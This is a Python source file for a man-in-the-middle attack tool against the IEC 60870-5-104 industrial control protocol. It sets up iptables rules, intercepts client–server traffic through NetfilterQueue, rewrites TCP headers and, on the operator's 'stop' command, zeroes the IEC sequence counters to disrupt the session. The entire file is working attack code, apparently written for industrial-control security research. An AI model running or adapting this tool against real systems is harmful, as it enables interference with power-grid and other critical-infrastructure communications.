import netfilterqueue
import typer
from netfilterqueue import NetfilterQueue
from kamene.layers.inet import *
from kamene.all import *
import warnings
import threading
from utils.utils import *

warnings.simplefilter("ignore")


class IEC104MITM:
    def __init__(self, client_ip: str, server_ip: str, server_port: int):
        self.client_ip = client_ip
        self.server_ip = server_ip
        self.server_port = server_port
        self.client_port = None

        self.attack = False

    def extract_tcp_and_iec_values(self, packet: IP) -> (int, int, int, int, int):
        tcp_seq, tcp_seq_next, tcp_ack = extract_tcp_details(packet)
        iec_tx, iec_rx = None, None
        if extract_iec_details(packet) is not None:
            iec_tx, iec_rx = extract_iec_details(packet)
        return tcp_seq, tcp_ack, iec_tx, iec_rx

    def update_and_send(self, packet: IP, tcp_seq: int, tcp_ack: int, iec_tx: int, iec_rx: int):
        packet = update_tcp_header(packet, tcp_seq, tcp_ack)

        if iec_tx is not None and iec_rx is not None:
            if self.attack:
                packet = update_iec_apci(packet, 0, 0)
            else:
                packet = update_iec_apci(packet, iec_tx, iec_rx)

        packet = update_checksums(packet)
        send(packet, verbose=False)

    def packet_handler(self, packet: netfilterqueue.Packet) -> None:
        smart_packet = IP(packet.get_payload())
        if smart_packet['IP'].src in [self.client_ip, self.server_ip] and \
                smart_packet['IP'].dst in [self.client_ip, self.server_ip] and \
                self.server_port in [smart_packet['TCP'].sport, smart_packet['TCP'].dport]:
            tcp_seq, tcp_ack, iec_tx, iec_rx = self.extract_tcp_and_iec_values(smart_packet)
            self.update_and_send(smart_packet, tcp_seq, tcp_ack, iec_tx, iec_rx)
            packet.drop()
        else:
            packet.accept()

    def read_command(self):
        while True:
            try:
                command = input("Command: ")
                if command == "stop":
                    self.attack = True
            except ValueError:
                pass

    def start(self, queue_id=1):
        net_filter_queue = NetfilterQueue()
        net_filter_queue.bind(queue_id, self.packet_handler)
        try:
            net_filter_queue.run()
        except KeyboardInterrupt:
            print('')

        net_filter_queue.unbind()


def main(
        client_ip: str = typer.Argument(..., help="IP address of the IEC client"),
        server_ip: str = typer.Argument(..., help="IP address of the IEC server"),
        server_port: int = typer.Option(2404, help="TCP port number of the IEC server.")
):
    if not is_ipv4_address(data=client_ip) or not is_ipv4_address(data=server_ip):
        typer.secho("[-] Invalid client/server IP provided.", fg=typer.colors.RED)
        exit(1)
    if not is_tcp_port(data=server_port):
        typer.secho("[-] Invalid server port provided.", fg=typer.colors.RED)
        exit(1)
    try:
        typer.secho("[*] Trying to setup iptables rules.", fg=typer.colors.YELLOW)
        setup_iptables(client_ip=client_ip, server_ip=server_ip, server_port=server_port)
        typer.secho("[+] Rules added!", fg=typer.colors.GREEN)
    except:
        typer.secho("[-] Something went wrong during rule manipulation!.", fg=typer.colors.RED)
        exit(1)

    mitm = IEC104MITM(client_ip, server_ip, server_port)
    thread1 = threading.Thread(target=mitm.start)
    thread1.daemon = True
    thread1.start()
    mitm.read_command()


if __name__ == "__main__":
    typer.run(main)
